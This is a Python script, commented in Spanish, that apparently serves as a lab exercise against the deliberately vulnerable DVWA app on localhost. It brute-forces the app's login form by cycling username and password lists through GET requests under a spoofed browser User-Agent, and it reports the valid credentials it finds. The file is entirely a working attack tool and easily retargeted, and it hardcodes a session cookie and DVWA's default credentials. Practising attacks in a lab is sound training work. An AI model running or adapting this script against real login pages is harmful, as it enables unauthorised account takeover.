import requests
import time

class BruteForceAttacker:
    def __init__(self, target_url, session_cookie):
        self.target_url = target_url
        self.session_cookie = session_cookie
        self.valid_credentials = []
        self.attempts = 0
        self.start_time = None
        
        # Headers HTTP que se utilizarán
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': f'PHPSESSID={session_cookie}; security=low'
        }
    
    def test_credentials(self, username, password):
        """Testea una combinación de usuario y contraseña"""
        try:
            # Parámetros GET (como funciona DVWA en nivel low)
            params = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            # Realizar la petición
            response = requests.get(
                self.target_url,
                params=params,
                headers=self.headers,
                timeout=5
            )
            
            self.attempts += 1
            
            # Verificar si el login fue exitoso
            if "Welcome to the password protected area" in response.text:
                return (username, password, True)
            else:
                return (username, password, False)
                
        except Exception as e:
            print(f"Error probando {username}:{password} - {e}")
            return (username, password, False)
    
    def brute_force_single_thread(self, users, passwords):
        print("Iniciando ataque de fuerza bruta...")
        self.start_time = time.time()
        
        for user in users:
            print(f"\nProbando usuario: {user}")
            for password in passwords:
                username, password, success = self.test_credentials(user, password)
                if success:
                    print(f" CREDENCIALES VÁLIDAS ENCONTRADAS: {username}:{password}")
                    self.valid_credentials.append((username, password))
                else:
                    print(f"  Fallo: {username}:{password}")
        
        self.print_results()
    
    def print_results(self):
        """Imprime los resultados del ataque"""
        elapsed_time = time.time() - self.start_time
        print("\n" + "="*60)
        print("RESULTADOS FINALES DEL ATAQUE")
        print("="*60)
        print(f" Tiempo total: {elapsed_time:.2f} segundos")
        print(f"Intentos realizados: {self.attempts}")
        print(f"Velocidad: {self.attempts/elapsed_time:.2f} intentos/segundo")
        print(f"Credenciales válidas encontradas: {len(self.valid_credentials)}")
        
        if self.valid_credentials:
            print("\nCREDENCIALES VÁLIDAS ENCONTRADAS:")
            for i, (user, password) in enumerate(self.valid_credentials, 1):
                print(f"   {i}. Usuario: {user} - Contraseña: {password}")
        else:
            print("\n No se encontraron credenciales válidas")
        print("="*60)

def main():
    # Configuración
    TARGET_URL = "http://localhost:4280/vulnerabilities/brute/"
    SESSION_COOKIE = "46mmtrrijgr3p91dj98kas0ou7"
    
    # Listas de usuarios y contraseñas
    users = ["admin", "gordonb", "1337", "pablo", "smithy"]
    passwords = ["password", "abc123", "charley", "letmein", "secret"]
    
    # Crear instancia del atacante
    attacker = BruteForceAttacker(TARGET_URL, SESSION_COOKIE)
    
    print("ATAQUE DE FUERZA BRUTA CON PYTHON REQUESTS")
    print("="*60)
    print(f"Target: {TARGET_URL}")
    print(f"Usuarios a probar: {len(users)}")
    print(f"Contraseñas a probar: {len(passwords)}")
    print(f"Total de combinaciones: {len(users) * len(passwords)}")
    print("="*60)
    
    # Ejecutar ataque single thread
    attacker.brute_force_single_thread(users, passwords)

if __name__ == "__main__":
    main()